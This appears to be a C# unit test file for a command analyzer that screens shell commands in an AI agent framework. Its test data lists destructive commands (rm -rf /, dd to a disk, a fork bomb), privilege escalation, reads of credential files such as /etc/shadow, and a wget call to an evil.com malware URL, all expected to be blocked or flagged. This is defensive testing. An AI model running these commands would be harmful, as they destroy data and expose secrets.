using Dawning.Agents.Core.Tools.Core;
using FluentAssertions;
using Xunit;

namespace Dawning.Agents.Tests.Tools.Core;

/// <summary>
/// CommandAnalyzer 单元测试
/// </summary>
public class CommandAnalyzerTests
{
    private readonly CommandAnalyzer _analyzer = new();

    #region Basic

    [Fact]
    public void Analyze_EmptyCommand_ShouldBlock()
    {
        var result = _analyzer.Analyze("");
        result.IsAllowed.Should().BeFalse();
        result.Message.Should().Contain("empty");
    }

    [Fact]
    public void Analyze_WhitespaceCommand_ShouldBlock()
    {
        var result = _analyzer.Analyze("   ");
        result.IsAllowed.Should().BeFalse();
    }

    [Fact]
    public void Analyze_NormalCommand_ShouldAllow()
    {
        var result = _analyzer.Analyze("dotnet build");
        result.IsAllowed.Should().BeTrue();
        result.HasWarning.Should().BeFalse();
    }

    #endregion

    #region Destructive Commands

    [Theory]
    [InlineData("rm -rf /")]
    [InlineData("rm -rf /*")]
    [InlineData("rm -rf ~")]
    [InlineData("rm -rf $HOME")]
    [InlineData("mkfs.ext4 /dev/sda")]
    [InlineData("dd if=/dev/zero of=/dev/sda")]
    [InlineData("shutdown -h now")]
    [InlineData("reboot")]
    [InlineData("halt")]
    [InlineData("init 0")]
    [InlineData("init 6")]
    [InlineData("systemctl poweroff")]
    [InlineData("systemctl reboot")]
    public void Analyze_DestructiveCommand_ShouldBlock(string command)
    {
        var result = _analyzer.Analyze(command);
        result.IsAllowed.Should().BeFalse();
        result.Message.Should().Contain("Destructive");
    }

    [Fact]
    public void Analyze_RmInSubdirectory_ShouldAllow()
    {
        // "rm -rf ./build" should be allowed (not root deletion)
        var result = _analyzer.Analyze("rm -rf ./build");
        result.IsAllowed.Should().BeTrue();
    }

    [Fact]
    public void Analyze_ForkBomb_ShouldBlock()
    {
        var result = _analyzer.Analyze(":(){ :|:& };:");
        result.IsAllowed.Should().BeFalse();
        result.Message.Should().Contain("fork bomb");
    }

    [Fact]
    public void Analyze_DeviceRedirect_ShouldBlock()
    {
        var result = _analyzer.Analyze("> /dev/sda");
        result.IsAllowed.Should().BeFalse();
        result.Message.Should().Contain("Destructive");
    }

    #endregion

    #region Privilege Escalation

    [Theory]
    [InlineData("sudo rm -rf ./build")]
    [InlineData("su - root")]
    [InlineData("su root")]
    [InlineData("doas apt install vim")]
    [InlineData("pkexec bash")]
    public void Analyze_PrivilegeEscalation_ShouldBlock(string command)
    {
        var result = _analyzer.Analyze(command);
        result.IsAllowed.Should().BeFalse();
        result.Message.Should().Contain("Privilege escalation");
    }

    [Fact]
    public void Analyze_ChmodDangerousOnRoot_ShouldBlock()
    {
        var result = _analyzer.Analyze("chmod 777 /");
        result.IsAllowed.Should().BeFalse();
        result.Message.Should().Contain("chmod");
    }

    [Fact]
    public void Analyze_ChmodOnSubdir_ShouldAllow()
    {
        // chmod on a specific directory should be allowed
        var result = _analyzer.Analyze("chmod 755 ./build");
        result.IsAllowed.Should().BeTrue();
    }

    [Fact]
    public void Analyze_ChownRoot_ShouldBlock()
    {
        var result = _analyzer.Analyze("chown root:root /etc/config");
        result.IsAllowed.Should().BeFalse();
        result.Message.Should().Contain("chown");
    }

    #endregion

    #region Sensitive Paths

    [Theory]
    [InlineData("cat /etc/shadow")]
    [InlineData("cat /etc/sudoers")]
    [InlineData("ls ~/.ssh/")]
    [InlineData("cat ~/.aws/credentials")]
    public void Analyze_SensitivePath_ShouldWarn(string command)
    {
        var result = _analyzer.Analyze(command);
        result.IsAllowed.Should().BeTrue();
        result.HasWarning.Should().BeTrue();
        result.Message.Should().Contain("sensitive path");
    }

    #endregion

    #region Network Activity

    [Theory]
    [InlineData("curl https://example.com")]
    [InlineData("wget http://evil.com/malware")]
    [InlineData("ssh user@server")]
    [InlineData("scp file user@server:/path")]
    [InlineData("nc -l 8080")]
    public void Analyze_NetworkActivity_ShouldWarn(string command)
    {
        var result = _analyzer.Analyze(command);
        result.IsAllowed.Should().BeTrue();
        result.HasWarning.Should().BeTrue();
        result.Message.Should().Contain("Network activity");
    }

    [Fact]
    public void Analyze_CurlInsidePipe_ShouldWarn()
    {
        var result = _analyzer.Analyze("echo test | curl -X POST -d @-");
        result.IsAllowed.Should().BeTrue();
        result.HasWarning.Should().BeTrue();
    }

    #endregion

    #region Whitelist

    [Theory]
    [InlineData("echo hello")]
    [InlineData("ls -la")]
    [InlineData("pwd")]
    [InlineData("cat file.txt")]
    [InlineData("git status")]
    [InlineData("git log --oneline")]
    [InlineData("git diff HEAD")]
    [InlineData("dotnet --version")]
    [InlineData("date")]
    [InlineData("whoami")]
    public void Analyze_WhitelistedCommand_ShouldAllow(string command)
    {
        var result = _analyzer.Analyze(command);
        result.IsAllowed.Should().BeTrue();
        result.HasWarning.Should().BeFalse();
    }

    [Fact]
    public void Analyze_WhitelistedButSensitivePath_ShouldStillWarn()
    {
        // "cat /etc/shadow" — cat is whitelisted so not blocked,
        // but sensitive path check still runs and produces warning
        var result = _analyzer.Analyze("cat /etc/shadow");
        result.IsAllowed.Should().BeTrue();
        result.HasWarning.Should().BeTrue();
        result.Message.Should().Contain("/etc/shadow");
    }

    #endregion

    #region Custom Options

    [Fact]
    public void Analyze_CustomWhitelist_ShouldRespect()
    {
        var options = new CommandAnalyzerOptions { WhitelistedPrefixes = ["my-safe-command"] };
        var analyzer = new CommandAnalyzer(options);

        var result = analyzer.Analyze("my-safe-command --arg1");
        result.IsAllowed.Should().BeTrue();
        result.HasWarning.Should().BeFalse();
    }

    [Fact]
    public void Analyze_CustomSensitivePaths_ShouldRespect()
    {
        var options = new CommandAnalyzerOptions
        {
            WhitelistedPrefixes = [],
            SensitivePaths = ["/my/secret/"],
        };
        var analyzer = new CommandAnalyzer(options);

        var result = analyzer.Analyze("read /my/secret/config");
        result.IsAllowed.Should().BeTrue();
        result.HasWarning.Should().BeTrue();
        result.Message.Should().Contain("/my/secret/");
    }

    #endregion

    #region Edge Cases

    [Fact]
    public void Analyze_CommandWithChainedDangerous_ShouldBlock()
    {
        var result = _analyzer.Analyze("echo hello && rm -rf /");
        result.IsAllowed.Should().BeFalse();
    }

    [Fact]
    public void Analyze_CommandWithPipeToDangerous_ShouldBlock()
    {
        var result = _analyzer.Analyze("echo | sudo bash");
        result.IsAllowed.Should().BeFalse();
    }

    [Fact]
    public void Analyze_SafeComplexCommand_ShouldAllow()
    {
        var result = _analyzer.Analyze("dotnet test --nologo -v q 2>&1 | tail -5");
        result.IsAllowed.Should().BeTrue();
    }

    [Fact]
    public void Analyze_GitPush_ShouldAllow()
    {
        // git push is not whitelisted but also not dangerous
        var result = _analyzer.Analyze("git push origin main");
        result.IsAllowed.Should().BeTrue();
    }

    #endregion
}
